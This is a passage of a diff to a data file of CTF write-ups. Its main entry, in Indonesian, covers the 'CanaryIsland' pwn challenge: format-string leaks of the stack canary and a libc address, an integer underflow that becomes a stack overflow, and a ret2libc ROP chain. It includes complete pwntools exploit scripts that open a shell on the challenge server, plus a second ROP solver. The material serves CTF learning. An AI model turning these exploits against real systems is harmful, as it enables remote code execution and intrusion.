     "problemDescription": "Writeup: CanaryIsland (Pwn Challenge - SiebersecCTF)\n\nDokumen ini merangkum analisis kerentanan, struktur memori, dan strategi eksploitasi yang berhasil digunakan untuk menembus tantangan pwn CanaryIsland.\n\n1. Informasi Biner & Mitigasi Keamanan\n\nSebelum melangkah ke eksploitasi, pemeriksaan awal terhadap biner chal menunjukkan konfigurasi proteksi yang sangat ketat:\n\nArch: amd64-64-little (64-bit)\n\nRELRO: Full RELRO (Global Offset Table bersifat read-only, mencegah GOT overwrite)\n\nStack: Canary found (Mencegah modifikasi langsung pada return address tanpa bypass)\n\nNX: NX enabled (Stack tidak dapat dieksekusi, membutuhkan ROP)\n\nPIE: PIE enabled (Posisi biner acak di memori akibat pengaruh ASLR)\n\n2. Analisis Kerentanan (Vulnerability Analysis)\n\nMelalui bedah kode menggunakan analisis statis (reverse engineering), ditemukan dua titik kerentanan utama yang saling berkaitan di dalam fungsi main:\n\nA. Format String Vulnerability (Information Leak)\n\nProgram mencetak input nama pengguna secara langsung menggunakan fungsi printf tanpa menggunakan format penentu (format specifier):\n\nlea rax, [format]\nmov rdi, rax\ncall sym.imp.printf  ; Ekivalen dengan printf(format)\n\n\nKarena parameter dikontrol sepenuhnya oleh pengguna, kita bisa menyisipkan penentu format seperti %p untuk membocorkan nilai registers dan stack memori. Ini adalah kunci untuk melewati proteksi Canary dan ASLR (mencari alamat basis Libc).\n\nB. Integer Underflow & Stack Buffer Overflow\n\nProgram meminta ukuran alokasi memori melalui fungsi get_int() dan membatasi input maksimal sebesar 0x4f ($79$ desimal) menggunakan tipe data bertanda (signed integer):\n\ncall sym.get_int\ncmp dword [var_a4h], 0x4f\njg 0x12f6  ; Jika nilai input > 79, program melompat melewati fgets\n\n\nJika kita memasukkan nilai negatif seperti -1, kondisi jg (Jump if Greater) tidak akan terpenuhi karena $-1 < 79$.\n\nNamun, sesaat sebelum fungsi fgets dipanggil untuk membaca payload, program melakukan konversi nilai tersebut menggunakan instruksi movzx (Move with Zero-Extend) dari register 16-bit (ax) ke register 32-bit (ecx):\n\nmov eax, dword [var_a4h]\nmovzx ecx, ax  ; Nilai -1 (0xffffffff) dikonversi mengambil 16-bit bawah menjadi 0xffff (65535)\nmov esi, ecx   ; Memasukkan ukuran baru ke dalam argumen size fgets\ncall sym.imp.fgets\n\n\nInstruksi movzx mengubah nilai -1 menjadi 65535. Karena kapasitas buffer s di stack hanya dialokasikan sebesar $88$ byte (dari alamat rbp-0x60 ke posisi Canary di rbp-0x8), batas baca 65535 byte dari fgets memberikan kita celah Stack-based Buffer Overflow yang sangat besar untuk mengontrol Return Address (RIP).\n\n3. Strategi Eksploitasi (Exploit Strategy)\n\nLangkah 1: Membocorkan Canary & Alamat Libc\n\nBerdasarkan visualisasi tata letak stack memori:\n\nVariabel input format berada pada posisi rbp-0xa0.\n\nJarak dari format ke Canary (rbp-0x8) adalah $0\\text{xa0} - 0\\text{x8} = 0\\text{x98}$ byte ($152$ desimal), yang setara dengan $19$ slot stack 64-bit.\n\nMengingat pemetaan argumen printf pada arsitektur x86_64 dimulai dari indeks stack ke-6 ditambah 1, maka posisi Canary berada tepat pada indeks format string %27$p.\n\nPosisi Return Address utama (alamat Libc penunjuk fungsi __libc_start_call_main+120) berada tepat pada indeks format string %29$p.\n\nJarak konstan (offset) dari alamat leak indeks 29 ke Libc Base pada biner libc.so.6 (GLIBC 2.39) yang diberikan adalah tepat 0x2a578.\n\nLangkah 2: Penanganan Badchar (\\x0a)\n\nFungsi fgets memiliki sifat dasar akan berhenti membaca input jika mendeteksi byte Newline (\\x0a). Karena ASLR mengacak memori pada setiap eksekusi, ada kemungkinan alamat Canary atau fungsi Libc (seperti system atau /bin/sh) mengandung byte 0x0a secara acak.\n\nUntuk mengatasinya, skrip eksploitasi dikonfigurasi melakukan penyaringan (looping connection) secara otomatis sampai mendapatkan alokasi alamat memori yang bersih dari badchar \\x0a.\n\nLangkah 3: ROP Chain & Penyelarasan Stack (MOVAPS Fix)\n\nKita menyusun rantai instruksi Return-Oriented Programming (ROP) berbasis teknik Ret2Libc:\n\nIsi buffer s dengan padding sampah sebanyak 88 byte ($0\\text{x60} - 0\\text{x8} = 0\\text{x58} = 88$).\n\nMasukkan nilai Canary remote yang berhasil dibocorkan agar program tidak mendeteksi manipulasi stack (__stack_chk_fail).\n\nMasukkan dummy data 8 byte untuk menimpa posisi Saved RBP.\n\nMasukkan gadget ret ekstra. Langkah ini wajib dilakukan untuk meluruskan Stack Alignment kelipatan 16-byte sebelum memicu instruksi movaps di dalam fungsi system pada sistem operasi modern (Ubuntu/Debian).\n\nMasukkan gadget pop rdi; ret untuk menyuplai argumen pertama ke fungsi system.\n\nMasukkan alamat string \"/bin/sh\" yang berada di dalam Libc.\n\nMasukkan alamat fungsi system dari Libc untuk mengeksekusi shell.\n\n4. Kode Eksploitasi Akhir (Python Script)\n\nBerikut adalah kode eksploitasi final menggunakan pustaka pwntools:\n\nfrom pwn import *\nimport time\n\nelf = ELF('./chal')\nlibc = ELF('./libc.so.6')\ncontext.binary = elf\n\noffset_libc = 0x2a578  # Offset presisi GLIBC 2.39 indeks 29\n\nwhile True:\n    try:\n        # Menghubungkan ke server tantangan remote\n        p = remote('chal.sieberr.live', 21003)\n        \n        # 1. Bocorkan Canary & Alamat Libc Remote\n        p.sendlineafter(b\"What is your name?\", b\"%27$p %29$p\")\n        p.recvuntil(b\"Welcome, \")\n        leak_data = p.recvline().strip().split()\n        \n        canary = int(leak_data[0], 16)\n        leak_libc = int(leak_data[1], 16)\n        libc.address = leak_libc - offset_libc\n        \n        # 2. Ambil Gadget ROP dari Libc terhitung\n        rop = ROP(libc)\n        pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]\n        ret = rop.find_gadget(['ret'])[0]\n        bin_sh = next(libc.search(b\"/bin/sh\\x00\"))\n        system_addr = libc.symbols['system']\n        \n        # Saringan Badchar \\x0a (Memastikan payload tidak terpotong prematur oleh fgets)\n        check_bytes = p64(canary) + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system_addr)\n        if b'\\x0a' in check_bytes:\n            p.close()\n            continue\n            \n        log.success(f\"Libc Base Remote Sukses: {hex(libc.address)}\")\n        log.success(f\"Canary Remote Sukses: {hex(canary)}\")\n        \n        # 3. Strukturisasi Payload ROP (Padding Buffer: 88 byte)\n        payload = b\"A\" * 88\n        payload += p64(canary)\n        payload += b\"B\" * 8          # Saved RBP\n        payload += p64(ret)          # Penyelaras Stack 16-byte (MOVAPS Fix)\n        payload += p64(pop_rdi)       # Konfigurasi parameter fungsi\n        payload += p64(bin_sh)        # RDI = Alamat \"/bin/sh\"\n        payload += p64(system_addr)  # Panggil system()\n        \n        # 4. Kirim serangan pemicu Integer Underflow\n        p.sendlineafter(b\"How much space do you want?\", b\"-1\")\n        p.sendline(payload)          \n        \n        # Berikan jeda transmisi soket agar proses perpindahan ke /bin/sh stabil\n        time.sleep(0.5)\n        p.clean(timeout=0.5)\n        \n        log.info(\"Membuka interaksi Shell...\")\n        p.interactive()\n        break\n        \n    except Exception:\n        try: p.close()\n        except: pass\n\n\nHasil Eksekusi Sukses:\n\n[+] Libc Base Remote Sukses: 0x7020bfd00000\n[+] Canary Remote Sukses: 0x7bd421e892945400\n[*] Membuka interaksi Shell... Ketik 'cat flag.txt'\n[*] Switching to interactive mode\n$ cat flag.txt\nsctf{C4tS_L0ve_pl4y1Ng_1n_tHe_suN}\n\n\n5. Kesimpulan\n\nTantangan CanaryIsland mengajarkan pentingnya melakukan sanitasi tipe data (menghindari konversi implisit signed/unsigned yang berbahaya pada fungsi alokasi ukuran seperti fgets / read) dan menghindari penggunaan printf secara langsung tanpa format specifier yang aman.",
@@ -994,7 +994,7 @@ export const siebersecCtfWriteups: WriteUp[] = [
     "solution": [
       {
         "title": "Solver Script",
-        "content": "The complete exploit/solver script (solve.py) is provided below:",
+        "content": "",
         "code": "from pwn import *\r\nimport time\r\n\r\nelf = ELF('./chal')\r\nlibc = ELF('./libc.so.6')\r\ncontext.binary = elf\r\n\r\noffset_libc = 0x2a578  # Offset presisi GLIBC 2.39 indeks 29\r\n\r\nwhile True:\r\n    try:\r\n        p = remote('chal.sieberr.live', 21003)\r\n        \r\n        # 1. Leak Canary & Libc Remote\r\n        p.sendlineafter(b\"What is your name?\", b\"%27$p %29$p\")\r\n        p.recvuntil(b\"Welcome, \")\r\n        leak_data = p.recvline().strip().split()\r\n        \r\n        canary = int(leak_data[0], 16)\r\n        leak_libc = int(leak_data[1], 16)\r\n        libc.address = leak_libc - offset_libc\r\n        \r\n        # 2. Ambil Gadget ROP\r\n        rop = ROP(libc)\r\n        pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]\r\n        ret = rop.find_gadget(['ret'])[0]\r\n        bin_sh = next(libc.search(b\"/bin/sh\\x00\"))\r\n        system_addr = libc.symbols['system']\r\n        \r\n        # Saringan Badchar \\x0a (Newline pembunuh fgets)\r\n        check_bytes = p64(canary) + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system_addr)\r\n        if b'\\x0a' in check_bytes:\r\n            p.close()\r\n            continue\r\n            \r\n        log.success(f\"Libc Base Remote Sukses: {hex(libc.address)}\")\r\n        log.success(f\"Canary Remote Sukses: {hex(canary)}\")\r\n        \r\n        # 3. Susun Payload Utama (Padding: 88 byte)\r\n        payload = b\"A\" * 88\r\n        payload += p64(canary)\r\n        payload += b\"B\" * 8          # Saved RBP\r\n        payload += p64(ret)          # Stack Alignment (MOVAPS Fix)\r\n        payload += p64(pop_rdi)\r\n        payload += p64(bin_sh)\r\n        payload += p64(system_addr)\r\n        \r\n        # 4. Kirim Serangan secara hati-hati\r\n        p.sendlineafter(b\"How much space do you want?\", b\"-1\")\r\n        \r\n        # Kirim payload dan berikan jeda micro-second agar server memproses stack frame\r\n        p.sendline(payload)\r\n        time.sleep(0.5)\r\n        \r\n        # Bersihkan sisa output buffer sebelum masuk mode interaktif\r\n        p.clean(timeout=0.5)\r\n        \r\n        log.info(\"Membuka interaksi Shell... Ketik 'cat flag.txt'\")\r\n        p.interactive()\r\n        break\r\n        \r\n    except Exception:\r\n        try: p.close()\r\n        except: pass"
       }
     ],
@@ -1010,7 +1010,7 @@ export const siebersecCtfWriteups: WriteUp[] = [
     "points": 0,
     "date": "2026-07-08",
     "author": "Nattt",
-    "ctfName": "SiebersecCTF",
+    "ctfName": "Siebersec CTF",
     "tags": [],
     "description": "Writeup for challenge SiebersecCTF 2026 - owo what's this? (Pwn)",
     "problemDescription": "",
@@ -1027,7 +1027,7 @@ export const siebersecCtfWriteups: WriteUp[] = [
       },
       {
         "title": "Solver Script",
-        "content": "The complete exploit/solver script (solve.py) is provided below:",
+        "content": "",
         "code": "from pwn import *\r\n\r\np = remote('chal.sieberr.live', 21001)\r\n# p = process('./owo')\r\n\r\n# Alamat presisi dari hasil objdump\r\npop_rdi_ret = 0x0040119e \r\nret_gadget = 0x0040119f   # Digunakan untuk Stack Alignment 16-byte\r\ntarget_func = 0x004011a3\r\nargument_sus = 67416741\r\n\r\n# ROP Chain yang sudah diperbaiki alignment-nya\r\npayload = b\"A\" * 24\r\npayload += p64(ret_gadget)   # <--- Penyelamat dari MOVAPS crash\r\npayload += p64(pop_rdi_ret)\r\npayload += p64(argument_sus)\r\npayload += p64(target_func)\r\n\r\nlog.info(\"Mengirimkan ROP Chain dengan Stack Alignment Fix...\")\r\np.sendlineafter(b\">>> \", payload)\r\np.interactive()"
       }
     ],
